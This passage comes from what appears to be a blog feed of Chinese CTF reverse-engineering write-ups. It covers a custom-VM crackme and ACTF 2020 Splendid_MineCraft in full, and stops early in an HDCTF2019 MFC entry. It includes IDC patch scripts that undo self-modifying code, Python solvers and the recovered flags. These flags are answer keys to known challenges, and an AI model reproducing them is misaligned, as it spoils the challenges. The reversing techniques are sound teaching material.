<span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">reg = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">code = op[pos]</span><br><span class="line"><span class="keyword">while</span>(code != <span class="number">0xf4</span>):</span><br><span class="line">    code = op[pos]</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0Xf1</span>:</span><br><span class="line">        tmp = op[pos+<span class="number">1</span>]</span><br><span class="line">        x = op[pos+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0xe1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[0] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[1] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[2] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag[%d] = reg[0]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[3] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag[%d] = reg[1]&quot;</span> % x)</span><br><span class="line">        pos += <span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0] ^= reg[1]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;check_len == 21&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0] *= reg[3]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0], reg[1] = reg[1], reg[0]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0] = reg[2] + 2 * reg[1] + 3 * reg[0]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pos += <span class="number">1</span></span><br></pre></td></tr></table></div></figure><p>分层还是相当明显的</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">check_len == 21</span><br><span class="line">reg[0] = flag[0]</span><br><span class="line">reg[1] = flag[1]</span><br><span class="line">reg[0] ^= reg[1]</span><br><span class="line">flag[0] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[1]</span><br><span class="line">reg[1] = flag[2]</span><br><span class="line">reg[0] ^= reg[1]</span><br><span class="line">flag[1] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[2]</span><br><span class="line">reg[1] = flag[3]</span><br><span class="line">reg[0] ^= reg[1]</span><br><span class="line">flag[2] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[3]</span><br><span class="line">reg[1] = flag[4]</span><br><span class="line">reg[0] ^= reg[1]</span><br><span class="line">flag[3] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[4]</span><br><span class="line">reg[1] = flag[5]</span><br><span class="line">reg[0] ^= reg[1]</span><br><span class="line">flag[4] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[5]</span><br><span class="line">reg[1] = flag[6]</span><br><span class="line">reg[0] ^= reg[1]</span><br><span class="line">flag[5] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[6]</span><br><span class="line">reg[1] = flag[7]</span><br><span class="line">reg[2] = flag[8]</span><br><span class="line">reg[3] = flag[12]</span><br><span class="line">reg[0] = reg[2] + 2 * reg[1] + 3 * reg[0]</span><br><span class="line">reg[0] *= reg[3]</span><br><span class="line">flag[6] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[7]</span><br><span class="line">reg[1] = flag[8]</span><br><span class="line">reg[2] = flag[9]</span><br><span class="line">reg[3] = flag[12]</span><br><span class="line">reg[0] = reg[2] + 2 * reg[1] + 3 * reg[0]</span><br><span class="line">reg[0] *= reg[3]</span><br><span class="line">flag[7] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[8]</span><br><span class="line">reg[1] = flag[9]</span><br><span class="line">reg[2] = flag[10]</span><br><span class="line">reg[3] = flag[12]</span><br><span class="line">reg[0] = reg[2] + 2 * reg[1] + 3 * reg[0]</span><br><span class="line">reg[0] *= reg[3]</span><br><span class="line">flag[8] = reg[0]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[13]</span><br><span class="line">reg[1] = flag[19]</span><br><span class="line">reg[0], reg[1] = reg[1], reg[0]</span><br><span class="line">flag[13] = reg[0]</span><br><span class="line">flag[19] = reg[1]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[14]</span><br><span class="line">reg[1] = flag[18]</span><br><span class="line">reg[0], reg[1] = reg[1], reg[0]</span><br><span class="line">flag[14] = reg[0]</span><br><span class="line">flag[18] = reg[1]</span><br><span class="line"></span><br><span class="line">reg[0] = flag[15]</span><br><span class="line">reg[1] = flag[17]</span><br><span class="line">reg[0], reg[1] = reg[1], reg[0]</span><br><span class="line">flag[15] = reg[0]</span><br><span class="line">flag[17] = reg[1]</span><br></pre></td></tr></table></div></figure><p>然后对输出交叉引用找到真flag</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216164.png" alt="image-20221220120845852"></p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x0c</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag[<span class="number">13</span>], flag[<span class="number">19</span>] = flag[<span class="number">19</span>], flag[<span class="number">13</span>]</span><br><span class="line">flag[<span class="number">14</span>], flag[<span class="number">18</span>] = flag[<span class="number">18</span>], flag[<span class="number">14</span>]</span><br><span class="line">flag[<span class="number">15</span>], flag[<span class="number">17</span>] = flag[<span class="number">17</span>], flag[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> ((i * <span class="number">3</span> + flag[<span class="number">9</span>] * <span class="number">2</span> + flag[<span class="number">10</span>]) * flag[<span class="number">12</span>]) &amp; <span class="number">0xff</span> == flag[<span class="number">8</span>]:</span><br><span class="line">        flag[<span class="number">8</span>] = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> ((i * <span class="number">3</span> + flag[<span class="number">8</span>] * <span class="number">2</span> + flag[<span class="number">9</span>]) * flag[<span class="number">12</span>]) &amp; <span class="number">0xff</span> == flag[<span class="number">7</span>]:</span><br><span class="line">        flag[<span class="number">7</span>] = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> ((i * <span class="number">3</span> + flag[<span class="number">7</span>] * <span class="number">2</span> + flag[<span class="number">8</span>]) * flag[<span class="number">12</span>]) &amp; <span class="number">0xff</span> == flag[<span class="number">6</span>]:</span><br><span class="line">        flag[<span class="number">6</span>] = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i] ^= flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_hav3_r3v3rs3_1t!&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF新生赛2020_Splendid_MineCraft</title>
      <link href="/2022/12/15/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Splendid-MineCraft/"/>
      <url>/2022/12/15/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Splendid-MineCraft/</url>
      
        <content type="html"><![CDATA[        <h2 id="ACTF新生赛2020-Splendid-MineCraft"   >          <a href="#ACTF新生赛2020-Splendid-MineCraft" class="heading-link"><i class="fas fa-link"></i></a><a href="#ACTF新生赛2020-Splendid-MineCraft" class="headerlink" title="[ACTF新生赛2020]Splendid_MineCraft"></a>[ACTF新生赛2020]Splendid_MineCraft</h2>      <p>32位ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215872.png" alt="image-20221215001650428"></p><p>首先是输入长度校验并且校验格式</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215873.png" alt="image-20221215001749437"></p><p>dword+word &#x3D; 4 + 2  &#x3D; 6</p><p>看出ACTF{}里面是三段由<code>_</code>分割的<code>xxxxxx</code></p><p>3 * 6 + 5 + 2 + 1 刚好26位</p><p>第一段</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215874.png" alt="image-20221215002210823"></p><p>看到<code>((int (__cdecl *)(int *))unk_4051D8)(&amp;v17)</code>猜测是一个函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215875.png" alt="image-20221215002251050"></p><p>直接转换成代码</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215876.png" alt="image-20221215002322886"></p><p>是SMC，写脚本</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    auto addr = 0x4051FC;</span><br><span class="line">    auto i = 0;</span><br><span class="line">    for(i = 0; i &lt;= 337; ++i) &#123;</span><br><span class="line">        PatchByte(addr+i, Byte(addr+i)^0x72);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215877.png" alt="image-20221215000550376"></p><p>写脚本解密</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="string">&quot;Welcome &quot;</span></span><br><span class="line">v6 = <span class="string">&quot;3@1b;b&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    x = (<span class="built_in">ord</span>(v5[i+<span class="number">1</span>]) ^ <span class="built_in">ord</span>(v6[i]))+ <span class="number">0x23</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yOu0y*</span><br></pre></td></tr></table></div></figure><p>第二段</p><p>也是SMC，idc脚本</p><p>v9 动调可得为0x20</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215878.png" alt="image-20221215000723084"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    auto addr = 0x405018;</span><br><span class="line">    auto i = 256;</span><br><span class="line">    for(i = 256; i &lt; 496; ++i) &#123;</span><br><span class="line">        PatchByte(addr+i, Byte(addr+i)^0x20);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215879.png" alt="image-20221215000951263"></p><p>从最后的判断可以看出，输入异或上(i^0x83)，将其作为表v6的索引与a2对比，a2则是内存中的一段数据，动调或直接计算偏移</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215880.png" alt="image-20221215001241663"></p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">keyboard = [</span><br><span class="line"><span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x5B</span>, <span class="number">0x9D</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x98</span>, <span class="number">0x68</span>, <span class="number">0x8C</span>, <span class="number">0x65</span>,</span><br><span class="line">  <span class="number">0xBB</span>, <span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0xD4</span>, <span class="number">0x09</span>, <span class="number">0xFD</span>, <span class="number">0xF3</span>, <span class="number">0x5C</span>, <span class="number">0x3C</span>, <span class="number">0x4C</span>,</span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x8E</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x80</span>, <span class="number">0x44</span>, <span class="number">0xD6</span>, <span class="number">0xA9</span>, <span class="number">0x01</span>, <span class="number">0x32</span>,</span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x29</span>, <span class="number">0x90</span>, <span class="number">0xBC</span>, <span class="number">0xC0</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x1D</span>,</span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x67</span>, <span class="number">0x7D</span>, <span class="number">0x2A</span>, <span class="number">0x2C</span>, <span class="number">0x59</span>, <span class="number">0x9E</span>, <span class="number">0x3D</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>,</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x43</span>, <span class="number">0x74</span>, <span class="number">0xD1</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x02</span>, <span class="number">0x4B</span>, <span class="number">0xAE</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0xC6</span>, <span class="number">0x73</span>, <span class="number">0xB0</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>,</span><br><span class="line">  <span class="number">0xB6</span>, <span class="number">0xD9</span>, <span class="number">0xDE</span>, <span class="number">0x7B</span>, <span class="number">0xCF</span>, <span class="number">0x4F</span>, <span class="number">0xB3</span>, <span class="number">0xD5</span>, <span class="number">0x08</span>, <span class="number">0x7C</span>,</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x71</span>, <span class="number">0x12</span>, <span class="number">0x06</span>, <span class="number">0x37</span>, <span class="number">0xFF</span>, <span class="number">0x7F</span>, <span class="number">0xB7</span>, <span class="number">0x46</span>, <span class="number">0x42</span>,</span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0xC9</span>, <span class="number">0xD0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0xCE</span>, <span class="number">0xBD</span>, <span class="number">0x6C</span>, <span class="number">0xE5</span>, <span class="number">0x6F</span>,</span><br><span class="line">  <span class="number">0xA5</span>, <span class="number">0x15</span>, <span class="number">0xED</span>, <span class="number">0x64</span>, <span class="number">0xF0</span>, <span class="number">0x23</span>, <span class="number">0x35</span>, <span class="number">0xE7</span>, <span class="number">0x0C</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0xA4</span>, <span class="number">0xD7</span>, <span class="number">0x51</span>, <span class="number">0x75</span>, <span class="number">0x9A</span>, <span class="number">0xF2</span>, <span class="number">0x1E</span>, <span class="number">0xEB</span>, <span class="number">0x58</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0x94</span>, <span class="number">0xC3</span>, <span class="number">0x2F</span>, <span class="number">0x56</span>, <span class="number">0xF7</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0x47</span>, <span class="number">0xFB</span>, <span class="number">0x83</span>,</span><br><span class="line">  <span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0x21</span>, <span class="number">0x4A</span>, <span class="number">0x24</span>, <span class="number">0x07</span>, <span class="number">0x1C</span>, <span class="number">0x8A</span>, <span class="number">0x5A</span>, <span class="number">0x17</span>,</span><br><span class="line">  <span class="number">0x1B</span>, <span class="number">0xDA</span>, <span class="number">0xEC</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0xB4</span>, <span class="number">0x48</span>, <span class="number">0x88</span>, <span class="number">0xF4</span>,</span><br><span class="line">  <span class="number">0xB8</span>, <span class="number">0x27</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x97</span>, <span class="number">0xBE</span>, <span class="number">0x53</span>, <span class="number">0xC2</span>, <span class="number">0xE8</span>,</span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x1A</span>, <span class="number">0xE9</span>, <span class="number">0x2D</span>, <span class="number">0x14</span>, <span class="number">0x0B</span>, <span class="number">0xBF</span>, <span class="number">0xB5</span>, <span class="number">0x40</span>, <span class="number">0x79</span>,</span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0x3E</span>, <span class="number">0x19</span>, <span class="number">0x5D</span>, <span class="number">0xF8</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0x5F</span>, <span class="number">0xDB</span>, <span class="number">0xFA</span>,</span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x8B</span>, <span class="number">0x6E</span>, <span class="number">0xA2</span>, <span class="number">0xDF</span>, <span class="number">0x16</span>, <span class="number">0xE2</span>, <span class="number">0x63</span>, <span class="number">0xB1</span>, <span class="number">0x20</span>,</span><br><span class="line">  <span class="number">0xCB</span>, <span class="number">0xBA</span>, <span class="number">0xEE</span>, <span class="number">0x8D</span>, <span class="number">0xAA</span>, <span class="number">0xC8</span>, <span class="number">0xC7</span>, <span class="number">0xC5</span>, <span class="number">0x05</span>, <span class="number">0x66</span>,</span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x3A</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0x0D</span>, <span class="number">0xCA</span>, <span class="number">0x84</span>, <span class="number">0x4E</span>, <span class="number">0xF5</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x92</span>, <span class="number">0xDC</span>, <span class="number">0xDD</span>, <span class="number">0x9C</span>, <span class="number">0x3F</span>, <span class="number">0x55</span>, <span class="number">0x96</span>, <span class="number">0xA1</span>, <span class="number">0x9F</span>,</span><br><span class="line">  <span class="number">0xCD</span>, <span class="number">0x9B</span>, <span class="number">0xE3</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0x78</span>, <span class="number">0x10</span>, <span class="number">0x2E</span>,</span><br><span class="line">  <span class="number">0x82</span>, <span class="number">0x8F</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x04</span>, <span class="number">0xAC</span>, <span class="number">0x41</span>, <span class="number">0x93</span>, <span class="number">0xD3</span>, <span class="number">0x3B</span>,</span><br><span class="line">  <span class="number">0xEF</span>, <span class="number">0x03</span>, <span class="number">0x81</span>, <span class="number">0x70</span>, <span class="number">0xA6</span>, <span class="number">0x1F</span>, <span class="number">0x22</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x6A</span>,</span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0x87</span>, <span class="number">0xAD</span>, <span class="number">0x49</span>, <span class="number">0x0F</span>, <span class="number">0xAF</span></span><br><span class="line">]</span><br><span class="line">key = [<span class="number">0x30</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0x90</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    x = keyboard.index(key[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((x^(<span class="number">0x83</span>+i))&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span> )</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knowo3</span><br></pre></td></tr></table></div></figure><p>第三段</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215881.png" alt="image-20221215001423486"></p><p>能直接看到的东西差不多用完了，看汇编</p><p>调用Congratulations之前有个strcmp的判断</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215882.png" alt="image-20221214233643289"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5mcsM&lt;</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;yOu0y*_knowo3_5mcsM&lt;&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF2019_MFC</title>
      <link href="/2022/12/14/HDCTF2019-MFC/"/>
      <url>/2022/12/14/HDCTF2019-MFC/</url>
      
        <content type="html"><![CDATA[        <h2 id="HDCTF2019-MFC"   >          <a href="#HDCTF2019-MFC" class="heading-link"><i class="fas fa-link"></i></a><a href="#HDCTF2019-MFC" class="headerlink" title="[HDCTF2019]MFC"></a>[HDCTF2019]MFC</h2>      <p>打开是一个32位MFC</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215468.png" alt="image-20221214212047241"></p><p>提示说在控件里面，用xspy打开</p><p>可以发现在handle后面跟了一串16进制字符串</p><p><code>944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b</code></p><p>而且还有个奇怪的消息函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215997.png" alt="image-20221214212401752"></p><p>写脚本触发消息函数</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 